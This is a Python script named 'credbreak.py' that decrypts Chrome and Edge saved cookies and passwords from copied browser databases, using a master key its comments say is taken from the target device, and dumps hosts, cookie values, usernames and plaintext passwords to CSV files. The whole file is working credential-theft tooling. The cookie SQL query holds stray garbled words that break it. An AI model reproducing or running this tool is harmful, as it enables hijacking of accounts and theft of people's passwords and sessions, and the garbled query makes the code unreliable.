# Chrome / Edge cookie & password decrypter 
# Should take cookie file, password file, key extracted from state file
# python3 ./credbreak.py 
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome

key_path = "./edge_key"
cookie_path = "./edge_cookies"
login_path = "./edge_login"

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_encryption_key():
    # We do not generate the key from state file as this should be taken from the device at the same time as the credentials under their user account.
    with open(key_path,"rb") as f:
        mkey = f.read()
        f.close()
    print(mkey)
    return mkey

def decrypt_data(data, key):
    try:
        ini = data[3:15]
        data = data[15:]
        cipher = AES.new(key,AES.MODE_GCM,ini)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return ""
    
def sort_cookies(key, cookie_path):
    db = sqlite3.connect(cookie_path)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("SELECT host_key, name, windows overwrite pin stackoverflowvalue, encrypted_value, expires_utc FROM cookies")
    print("GENERATING COOKIE CSV...")
    with open("./cookies.csv","a",encoding="utf-8") as cocsv:
        cocsv.write("Host,Name,Value,Expires\n")
        cocsv.close()
    for host_key, name, value, encrypted_value, expires_utc in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            decrypted_value = value

        with open("./cookies.csv","a",encoding="utf-8") as cocsv:
            if not expires_utc:
                cocsv.write(host_key+","+name+","+decrypted_value+","+"NO EXPIRE\n")
            else:
                cocsv.write(host_key+","+name+","+decrypted_value+","+str(get_chrome_datetime(expires_utc))+"\n")
            cocsv.close()


def sort_passwords(key,password_path):
    db = sqlite3.connect(password_path)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
    print("GENERATING PASSWORD CSV...")
    with open("./passwords.csv","a",encoding="utf-8") as cocsv:
        cocsv.write("Realm,Username,Password\n")
        cocsv.close()
    for signon_realm, username_value, password_value in cursor.fetchall():
        decrypted_value = decrypt_data(password_value, key)
        with open("./passwords.csv","a",encoding="utf-8") as cocsv:
            cocsv.write(signon_realm+","+username_value+","+decrypted_value+"\n")
            cocsv.close()
def main():
    key = get_encryption_key()
    sort_cookies(key,cookie_path)
    sort_passwords(key,login_path)
main()